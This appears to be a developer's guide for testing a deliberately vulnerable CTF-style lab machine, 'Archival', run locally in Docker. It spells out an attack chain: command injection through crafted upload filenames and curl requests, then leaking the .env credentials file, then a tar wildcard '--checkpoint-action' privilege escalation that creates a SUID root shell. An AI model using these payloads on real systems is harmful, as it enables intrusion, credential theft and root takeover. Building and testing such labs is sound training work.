# Testing Guide: Archival (Player Perspective)

To test the machine as a player, follow these steps:

## 1. Environment Setup

### Using Docker (Best for testing logic)
1. **Build the image**:
   ```bash
   cd machine/
   sudo docker build -t archival .
   ```
2. **Run the container**:
   ```bash
   sudo docker run -d -p 80:80 --name archival-test archival
   ```
3. **Access the web app**: Open `http://localhost` in your browser.

## Troubleshooting & Updates
If you need to update the files and re-test:
1. **Stop and Remove existing container**:
   ```bash
   sudo docker stop archival-test
   sudo docker rm archival-test
   ```
2. **Rebuild the image**:
   ```bash
   sudo docker build -t archival .
   ```
3. **Run the new container**:
   ```bash
   sudo docker run -d -p 80:80 --name archival-test archival
   ```

### Step 1: Web Foothold (Browser Method)
1. **Access the Portal**: Open `http://localhost` in your browser.
2. **Prepare the Payload**:
   - Since some shells/filesystems (like `zsh`) reject semicolons in filenames, it's easier to create a file first and then rename it:
     ```bash
     echo "test" > payload.jpg
     mv payload.jpg '"; id ;.jpg"'
     ```
3. **Upload via UI**:
   - On the web page, click **"Browse"** or **"Choose File"**.
   - Select the file named `"; id ;.jpg"`.
   - Before clicking upload, append `?debug=1` to the URL in your browser: `http://localhost/process.php?debug=1`.
   - Click **"Upload and Process"**.
4. **View Results**:
   - You will see the shell output directly on the page in the "Debug" box.

### Step 2: Lateral Move (Browser Method)
1. **Prepare the Credential Leak**:
   - Rename your payload file to leak the `.env`:
     ```bash
     mv '"; id ;.jpg"' '"; cat .env > uploads/creds.txt ;.jpg"'
     ```
2. **Upload via UI**:
   - Follow the same upload process as before.
3. **Access the Leak**:
   - Visit `http://localhost/uploads/creds.txt` (you'll need to find the session folder name from the debug output first).
3. SSH into the container (if SSH is running) or simulate with:
   ```bash
   sudo docker exec -it archival-test su - archivist
   ```

### Step 1: Web Foothold
1. Visit `http://localhost/index.php`.
2. Observe the "Upload Document" feature.
3. **Verify the exploit** using `curl` (this is more reliable than naming files locally):
   - Create a dummy file: `echo "test" > test.jpg`
   - Upload it using `curl` with a slash-free command like `id` to avoid `basename()` stripping the path:
     ```bash
     curl -X POST "http://localhost/process.php?debug=1" \
          -F 'document=@test.jpg;filename="; id ;.jpg"'
     ```
4. Verify execution:
   Look for the `uid=0(root)` or `uid=33(www-data)` in the **System Log** section of the response.
   *Note: Using `/` in the filename will cause `basename()` to strip the command, which is a realistic security constraint for this machine!*

### Step 2: Lateral Move
1. Use the same `curl` method to read the `.env` file:
   ```bash
   curl -X POST http://localhost/process.php?debug=1 \
        -F "document=@test.jpg;filename=; cat .env > uploads/creds.txt ;.jpg"
   ```
2. Retrieve the credentials (check the session directory for `creds.txt`):
   ```bash
   sudo docker exec archival-test find /var/www/html/uploads -name "creds.txt" -exec cat {} +
   ```
3. SSH into the container (if SSH is running) or simulate with:
   ```bash
   sudo docker exec -it archival-test su - archivist
   ```

### Step 3: Privilege Escalation
1. Check sudo permissions: `sudo -l`.
2. Create the `tar` wildcard files in `/home/archivist/backups`:
   ```bash
   cd /home/archivist/backups
   echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > shell.sh
   touch -- "--checkpoint=1"
   touch -- "--checkpoint-action=exec=sh shell.sh"
   ```
3. Trigger the backup script: `sudo /usr/local/bin/backup.sh`.
4. Check for the SUID shell: `/tmp/rootbash -p`.

## 3. Teardown
```bash
sudo docker stop archival-test
sudo docker rm archival-test
```
